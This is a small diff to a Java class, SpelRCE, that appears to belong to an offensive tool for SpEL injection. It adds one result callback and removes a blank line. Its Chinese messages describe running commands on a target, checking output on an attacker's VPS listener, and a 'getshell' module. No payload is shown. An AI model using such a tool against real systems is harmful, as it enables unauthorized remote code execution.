@@ -103,6 +103,7 @@ public class SpelRCE {
                         text = "命令执行成功，请在vps上查看信息";
                         callback.onResult(text);
                         text = "当前监听vpsIP： " + vpsIP + "监听端口: " + vpsPORT;
+                        callback.onResult(text);
                     }else{
                         text = "命令执行失败， " + "未知状态码";
                         callback.onResult(text);
@@ -146,7 +147,6 @@ public class SpelRCE {
                         response.append(inputLine);
                     }
                     in.close();
-
                     // 匹配响应内容中可能的漏洞提示
                     if (response.toString().contains("25")) {
                         text = "可能存在Spel注入漏洞，请用getshell模块" + "注入参数为: " + paramName;
